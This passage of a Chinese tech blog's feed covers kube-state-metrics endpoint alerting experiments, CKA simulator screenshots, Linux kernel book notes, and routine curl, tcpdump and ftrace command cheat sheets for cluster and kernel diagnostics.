    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>需要一个指标来告警k8s中endpoints中没有ip的项</p><p>类似于下面图中，有些ep是没有ip的，想要把这些项及时告警，及时处理查看原因</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227105708.png" alt="image.png"></p><p>可以看到，总共有7个ep，有4个是正常的，有3个是异常的(kube-dns、kubernetes-dashboard和metrics-server)</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>kube-state-metrics版本：v2.6.0</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># HELP kube_endpoint_address_available (Deprecated since v2.6.0) Number of addresses available in endpoint.</span><br><span class="hljs-comment"># TYPE kube_endpoint_address_available gauge</span><br><br><span class="hljs-comment"># HELP kube_endpoint_address_not_ready (Deprecated since v2.6.0) Number of addresses not ready in endpoint</span><br><span class="hljs-comment"># TYPE kube_endpoint_address_not_ready gauge</span><br><br><span class="hljs-comment"># HELP kube_endpoint_address Information about Endpoint available and non available addresses.</span><br><span class="hljs-comment"># TYPE kube_endpoint_address gauge</span><br></code></pre></td></tr></table></figure><h3 id="方法1：kube-endpoint-address-not-ready选择大于0的"><a href="#方法1：kube-endpoint-address-not-ready选择大于0的" class="headerlink" title="方法1：kube_endpoint_address_not_ready选择大于0的"></a>方法1：kube_endpoint_address_not_ready选择大于0的</h3><p>总共有7条，大于0的就是异常的</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227103325.png" alt="image.png"></p><p>进而，我们可以看到，kube-dns显示的是3，而kubernetes-dashboard和metrics-server显示的是1，这个是为什么呢？</p><h4 id="验证方式1"><a href="#验证方式1" class="headerlink" title="验证方式1"></a>验证方式1</h4><p>通过标题背景中的图片可以看到，ep中显示的是ip:port，我们可以看下这几个ep的具体细节：<br>如下图，kube-dns有1个ip，3个端口；kubernetes-dashboard有1个ip，1个端口；metrics-server有1个ip，1个端口</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227115503.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227115442.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227115420.png" alt="image.png"></p><h4 id="验证方式2"><a href="#验证方式2" class="headerlink" title="验证方式2"></a>验证方式2</h4><p>我们找来另一个集群k2，部署方式和k是一样的。<br>查看k2的这3个ep，可以看到分别是3、1、1.</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227120033.png" alt="image.png"></p><h3 id="方法2：kube-endpoint-address-available选等于0的"><a href="#方法2：kube-endpoint-address-available选等于0的" class="headerlink" title="方法2：kube_endpoint_address_available选等于0的"></a>方法2：kube_endpoint_address_available选等于0的</h3><p>总共有7条，等于0的就是异常的</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227103740.png" alt="image.png"></p><p>nginx那为什么显示的是3呢？<br>查看该集群，可以看到nginx下面有3项</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227120341.png" alt="image.png"></p><h3 id="方法3：kube-endpoint-address-ready-x3D-”false”-选大于0的"><a href="#方法3：kube-endpoint-address-ready-x3D-”false”-选大于0的" class="headerlink" title="方法3：kube_endpoint_address{ready&#x3D;”false”}选大于0的"></a>方法3：kube_endpoint_address{ready&#x3D;”false”}选大于0的</h3><p>因为选择的是ready&#x3D;”false”，所以显示出来的就是异常的</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227104136.png" alt="image.png"></p><p>我们再选择一下ready&#x3D;”true”<br>可以看到有6项，这是为什么呢？<br>仔细一看，kube_endpoint_address指标加入了ip的label，nginx因为有3个ip，所以被拆成了3项</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227120721.png" alt="image.png"></p><h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><p>v2.6.0加入了新的指标kube_endpoint_address<br>详情参考：<a href="https://github.com/kubernetes/kube-state-metrics/releases">https://github.com/kubernetes/kube-state-metrics/releases</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227101629.png" alt="image.png"></p><p>我们跳到1761，可以看到kube_endpoint_address将替代kube_endpoint_address_available和kube_endpoint_address_not_ready，所以用2.6.0采集出来的指标，显示kube_endpoint_address_available和kube_endpoint_address_not_ready Deprecated since v2.6.0呢</p><p>详情见：<a href="https://github.com/kubernetes/kube-state-metrics/pull/1761">https://github.com/kubernetes/kube-state-metrics/pull/1761</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227120934.png" alt="image.png"></p><p>结束~</p><h1 id="x3D-x3D-x3D-x3D-2023-2-7-更新-x3D-x3D-x3D-x3D"><a href="#x3D-x3D-x3D-x3D-2023-2-7-更新-x3D-x3D-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;&#x3D;&#x3D;2023.2.7 更新&#x3D;&#x3D;&#x3D;&#x3D;"></a>&#x3D;&#x3D;&#x3D;&#x3D;2023.2.7 更新&#x3D;&#x3D;&#x3D;&#x3D;</h1><h1 id="kube-endpoint-address-实验1：正常情况"><a href="#kube-endpoint-address-实验1：正常情况" class="headerlink" title="kube_endpoint_address 实验1：正常情况"></a>kube_endpoint_address 实验1：正常情况</h1><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207102835.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207104604.png" alt="image.png"></p><h2 id="普罗"><a href="#普罗" class="headerlink" title="普罗"></a>普罗</h2><p>查询ready&#x3D;”false”的条数，一条都没有。<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207104318.png" alt="image.png"></p><p>查询ready&#x3D;”true”的条数，总共有9条，此处所有的pod都是正常的。<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207104238.png" alt="image.png"></p><p>这9条数据是怎么和pod、ep所对应的呢？</p><p>kubernetes有1条<br>nginx有3条，对应ep中的3项，3个ip<br>kube-dns中有1条，对应ep中的3项，1个ip<br>metrics-server有1条<br>metrics-server-proxy有1条<br>dashboard-metrics-scraper有1条<br>kubernetes-dashboard有1条</p><h2 id="ep"><a href="#ep" class="headerlink" title="ep"></a>ep</h2><p>看一下这几个ep的详细信息：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207104949.png" alt="image.png"></p><p>Addresses有3条，普罗那显示了3条</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207105128.png" alt="image.png"></p><p>Addresses有1条，普罗那显示了1条</p><h1 id="kube-endpoint-address-实验2：某一个pod掉线-pod有ip"><a href="#kube-endpoint-address-实验2：某一个pod掉线-pod有ip" class="headerlink" title="kube_endpoint_address 实验2：某一个pod掉线(pod有ip)"></a>kube_endpoint_address 实验2：某一个pod掉线(pod有ip)</h1><h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p>修改nginx的一个pod，更改其镜像，使其宕掉</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207110803.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207110849.png" alt="image.png"></p><p>可以看到nginx处的ep由3个变成了2个</p><h2 id="普罗-1"><a href="#普罗-1" class="headerlink" title="普罗"></a>普罗</h2><p>此时普罗中 ready&#x3D;”true”的nginx变成了2条</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207111355.png" alt="image.png"></p><p>普罗中 ready&#x3D;”false”的nginx有了1条<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207111627.png" alt="image.png"></p><h2 id="ep-1"><a href="#ep-1" class="headerlink" title="ep"></a>ep</h2><p>再看nginx的ep：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207113935.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207110957.png" alt="image.png"></p><p>Addresses有2条，普罗那ready&#x3D;true显示了2条<br>NotReadyAddresses有1条，普罗那ready&#x3D;false显示了1条</p><h1 id="kube-endpoint-address-实验3：pod异常-pod无ip"><a href="#kube-endpoint-address-实验3：pod异常-pod无ip" class="headerlink" title="kube_endpoint_address 实验3：pod异常(pod无ip)"></a>kube_endpoint_address 实验3：pod异常(pod无ip)</h1><h2 id="场景-1"><a href="#场景-1" class="headerlink" title="场景"></a>场景</h2><p>场景：当k8s的网络插件有问题时，会导致pod分不到ip</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207112635.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207113121.png" alt="image.png"></p><h2 id="普罗-2"><a href="#普罗-2" class="headerlink" title="普罗"></a>普罗</h2><p>此时普罗中 ready&#x3D;”true”总共有6条，没有nginx相关的了</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207112942.png" alt="image.png"></p><p>普罗中 ready&#x3D;”false”的没有数据了<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207113152.png" alt="image.png"></p><p>所以，该指标(kube_endpoint_address)是检测不到这种异常场景的~</p><h2 id="ep-2"><a href="#ep-2" class="headerlink" title="ep"></a>ep</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207140241.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207140254.png" alt="image.png"></p><h1 id="源码剖析"><a href="#源码剖析" class="headerlink" title="源码剖析"></a>源码剖析</h1><p>参考：<a href="https://github.com/kubernetes/kube-state-metrics/blob/main/internal/store/endpoint.go">https://github.com/kubernetes/kube-state-metrics/blob/main/internal/store/endpoint.go</a></p><h2 id="kube-endpoint-address-available"><a href="#kube-endpoint-address-available" class="headerlink" title="kube_endpoint_address_available"></a>kube_endpoint_address_available</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207114742.png" alt="image.png"></p><h2 id="kube-endpoint-address-not-ready"><a href="#kube-endpoint-address-not-ready" class="headerlink" title="kube_endpoint_address_not_ready"></a>kube_endpoint_address_not_ready</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207114804.png" alt="image.png"></p><h2 id="kube-endpoint-address"><a href="#kube-endpoint-address" class="headerlink" title="kube_endpoint_address"></a>kube_endpoint_address</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207114838.png" alt="image.png"></p><p>寄语：你走的每一步都算数！</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/kubernetes/kube-state-metrics/releases">https://github.com/kubernetes/kube-state-metrics/releases</a><br><a href="https://github.com/kubernetes/kube-state-metrics/pull/1761">https://github.com/kubernetes/kube-state-metrics/pull/1761</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
      <tag>kube-state-metrics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】(202212)cka模拟器</title>
    <link href="/2022/12/24/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202212)%20cka%E6%A8%A1%E6%8B%9F%E5%99%A8/"/>
    <url>/2022/12/24/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202212)%20cka%E6%A8%A1%E6%8B%9F%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161552.png" alt="image.png"></p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161612.png" alt="image.png"></p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161629.png" alt="image.png"></p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161643.png" alt="image.png"></p><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161656.png" alt="image.png"></p><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161709.png" alt="image.png"></p><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161721.png" alt="image.png"></p><h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161738.png" alt="image.png"></p><h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161753.png" alt="image.png"></p><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161808.png" alt="image.png"></p><h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161819.png" alt="image.png"></p><h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161833.png" alt="image.png"></p><h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161940.png" alt="image.png"></p><h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161916.png" alt="image.png"></p><h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161957.png" alt="image.png"></p><h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162012.png" alt="image.png"></p><h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162029.png" alt="image.png"></p><h2 id="18"><a href="#18" class="headerlink" title="18"></a>18</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162045.png" alt="image.png"></p><h2 id="19"><a href="#19" class="headerlink" title="19"></a>19</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162059.png" alt="image.png"></p><h2 id="20"><a href="#20" class="headerlink" title="20"></a>20</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162112.png" alt="image.png"></p><h2 id="21"><a href="#21" class="headerlink" title="21"></a>21</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162125.png" alt="image.png"></p><h2 id="22"><a href="#22" class="headerlink" title="22"></a>22</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162138.png" alt="image.png"></p><h2 id="23"><a href="#23" class="headerlink" title="23"></a>23</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162152.png" alt="image.png"></p><h2 id="24"><a href="#24" class="headerlink" title="24"></a>24</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162207.png" alt="image.png"></p><h2 id="25"><a href="#25" class="headerlink" title="25"></a>25</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162220.png" alt="image.png"></p><p>参考答案：<br><a href="https://killer.sh/attendee/07579e88-c73f-4925-9c55-3d4aba3b012a/content">https://killer.sh/attendee/07579e88-c73f-4925-9c55-3d4aba3b012a/content</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux内核设计与实现</title>
    <link href="/2022/12/22/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    <url>/2022/12/22/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>本书作者：Robert Love<br>本书译者：陈莉君 康华</p><p>Linux内核之旅：<a href="http://kerneltravel.net/">http://kerneltravel.net/</a><br>内核版本：2.6.34</p><p>内核巨著《Understanding the Linux Kernel》<br>实践经典《Linux Device Drivers》</p><h2 id="第1章-Linux内核简介"><a href="#第1章-Linux内核简介" class="headerlink" title="第1章 Linux内核简介"></a>第1章 Linux内核简介</h2><p>一般情况下，Linux这个词汇主要是指内核</p><p>Linux内核开发者社区 最重要的论坛 lkml(linux kernel mailing list)  <a href="https://lkml.org/">https://lkml.org/</a><br>订阅邮件 <a href="http://vger.kernel.org/">http://vger.kernel.org/</a>   </p>]]></content>
    
    
    <categories>
      
      <category>linux内核调试</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux内核设计与实现</title>
    <link href="/2022/12/22/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/unsupported/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    <url>/2022/12/22/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/unsupported/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>本书作者：Robert Love<br>本书译者：陈莉君 康华</p><p>Linux内核之旅：<a href="http://kerneltravel.net/">http://kerneltravel.net/</a><br>内核版本：2.6.34</p><p>内核巨著《Understanding the Linux Kernel》<br>实践经典《Linux Device Drivers》</p><h2 id="第1章-Linux内核简介"><a href="#第1章-Linux内核简介" class="headerlink" title="第1章 Linux内核简介"></a>第1章 Linux内核简介</h2><p>一般情况下，Linux这个词汇主要是指内核</p><p>Linux内核开发者社区 最重要的论坛 lkml(linux kernel mailing list)  <a href="https://lkml.org/">https://lkml.org/</a><br>订阅邮件 <a href="http://vger.kernel.org/">http://vger.kernel.org/</a>   </p>]]></content>
    
    
    <categories>
      
      <category>linux内核调试</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【网络成长记】curl常用命令</title>
    <link href="/2022/12/21/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91curl%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/12/21/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91curl%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 这两个等价</span><br>time curl 191.168.3.100:30001<br>time curl web-nginx-entrypoint.default<br><br><span class="hljs-comment"># 这样子可行</span><br>time curl https://11.254.0.1:443/version --cacert /root/k8s/certs/ca.pem --key /root/k8s/certs/apiserver-key.pem --cert /root/k8s/certs/apiserver.pem<br><span class="hljs-comment"># 这样子不行</span><br>time curl kubernetes.default/version --cacert /root/k8s/certs/ca.pem --key /root/k8s/certs/apiserver-key.pem --cert /root/k8s/certs/apiserver.pem<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
    <tags>
      
      <tag>net</tag>
      
      <tag>curl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【网络成长记】tcpdump常用命令</title>
    <link href="/2022/12/21/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91tcpdump%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/12/21/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91tcpdump%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h2><p>-i 　　   指定监听的网络接口；<br>-n 　　  指定将每个监听到数据包中的域名转换成IP地址后显示，不把网络地址转换成名字；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">tcpdump -ne -i bond0 11.254.xxx<br>tcpdump -ne -i calixxx -c 10<br>tcpdump -nn -i cali8b980351434 -w 5-master-cali.cap<br>tcpdump -nn -i eth0 icmp<br><br>tcpdump -n -i veth0<br><br>ping -c 100 -I veth0 1.2.3.102<br>tcpdump -n -i veth0<br>tcpdump -n -i veth1<br>tcpdump -n -i br0<br><br>tcpdump -i eth0 -n <br>tcpdump -i eth0 -n -w eth0.cap<br>tcpdump udp port 53 <br><br><br>tcpdump host x.x.x.x -i any -n <br>tcpdump -eni bond0.0 -vvv port 443 and port 6443<br><br><br>[root@n18 ~]<span class="hljs-comment"># tcpdump port 53 udp</span><br>tcpdump: syntax error <span class="hljs-keyword">in</span> filter expression: syntax error<br><br><br>抓包内容输出到文件：<br><span class="hljs-comment"># 抓取指定网卡的包输出到test.cap</span><br>tcpdump -i en0 -w test.cap<br>之后我们可以把test.cap直接用wireshark打开，就可以很直观的分析包了。<br><br><span class="hljs-comment"># 用tcpdump输出cap文件包：</span><br>tcpdump -r test.cap<br><br><br><br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.kancloud.cn/pshizhsysu/linux/1799754">https://www.kancloud.cn/pshizhsysu/linux/1799754</a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
    <tags>
      
      <tag>net</tag>
      
      <tag>tcpdump</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux内核调试追踪技术</title>
    <link href="/2022/12/20/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E8%BF%BD%E8%B8%AA%E6%8A%80%E6%9C%AF/"/>
    <url>/2022/12/20/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E8%BF%BD%E8%B8%AA%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="文件源"><a href="#文件源" class="headerlink" title="文件源"></a>文件源</h2><p><a href="https://www.bilibili.com/video/BV1GT411J7us/?spm_id_from=333.880.my_history.page.click&vd_source=3d4bc6a91e11c12d0e3b57b4e50c9818">b站地址</a><br><a href="https://www.processon.com/view/link/62a09494637689075856157e">思维导图地址</a>     密码：linux</p><h2 id="如何调试linux内核？"><a href="#如何调试linux内核？" class="headerlink" title="如何调试linux内核？"></a>如何调试linux内核？</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221220153919.png" alt="image.png"></p><p>内核调试<br>日志：日志采集–日志分类和处理-用户查看日志</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221220154421.png" alt="image.png"></p><p>debugfs是一种虚拟的文件系统</p><h2 id="linux内核追踪系统之事件源"><a href="#linux内核追踪系统之事件源" class="headerlink" title="linux内核追踪系统之事件源"></a>linux内核追踪系统之事件源</h2><h2 id="linux追踪框架之ftrace"><a href="#linux追踪框架之ftrace" class="headerlink" title="linux追踪框架之ftrace"></a>linux追踪框架之ftrace</h2><p>可以实现对热点函数详细的追踪分析<br>执行和跟踪内核里某一个函数的调用过程</p><h3 id="前端工具：debugfs"><a href="#前端工具：debugfs" class="headerlink" title="前端工具：debugfs"></a>前端工具：debugfs</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 实践</span><br>1、进入debugfs目录  <br>$ <span class="hljs-built_in">cd</span> /sys/kernel/debug/tracing  <br>如果找不到目录，执行下列命令挂载debugfs：  <br>$ mount -t debugfs nodev /sys/kernel/debug<br><br>2、查询支持的追踪器  <br>$ <span class="hljs-built_in">cat</span> available_tracers  <br>常用的有两种：<br><br>-   <span class="hljs-keyword">function</span> 表示跟踪函数的执行；<br>-   function_graph 则是跟踪函数的调用关系；<br><br>3、查看支持追踪的内核函数和事件。其中函数就是内核中的函数名，而事件，则是内核源码中预先定义的跟踪点。  <br>//查看内核函数  <br>$ <span class="hljs-built_in">cat</span> available_filter_functions  <br>//查看事件  <br>$ <span class="hljs-built_in">cat</span> available_events<br><br>4、设置追踪函数：  <br>$ <span class="hljs-built_in">echo</span> do_sys_open &gt; set_graph_function<br><br>5、设置追踪器  <br>$ <span class="hljs-built_in">echo</span> function_graph &gt; current_tracer  <br>$ <span class="hljs-built_in">echo</span> funcgraph-proc &gt; trace_options<br><br>6、开启追踪  <br>$ <span class="hljs-built_in">echo</span> 1 &gt; tracing_on<br><br>7、执行一个 <span class="hljs-built_in">ls</span> 命令后，再关闭跟踪  <br>$ <span class="hljs-built_in">ls</span>  <br>$ <span class="hljs-built_in">echo</span> 0 &gt; tracing_on<br><br>8、最后一步，查看跟踪结果  <br>$ <span class="hljs-built_in">cat</span> trace<br></code></pre></td></tr></table></figure><h3 id="前端工具：trace-cmd"><a href="#前端工具：trace-cmd" class="headerlink" title="前端工具：trace-cmd"></a>前端工具：trace-cmd</h3><p>trace-cmd是ftrace的一个封装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装与使用</span><br>apt install trace-cmd<br>man trace-cmd<br><br><span class="hljs-comment"># 这两个列出来的是一样的</span><br>[root@k8s-node2 tracing]<span class="hljs-comment"># trace-cmd list -e |wc -l</span><br>1502<br><br>[root@k8s-node2 tracing]<span class="hljs-comment"># pwd</span><br>/sys/kernel/debug/tracing<br>[root@k8s-node2 tracing]<span class="hljs-comment"># cat available_events |wc -l</span><br>1502<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 实践</span><br>1、记录  <br>$ trace-cmd record -p function_graph -g do_sys_open -O funcgraph-proc <span class="hljs-built_in">ls</span><br><br>2、显示  <br>$ trace-cmd report<br></code></pre></td></tr></table></figure><h2 id="linux追踪框架之perf"><a href="#linux追踪框架之perf" 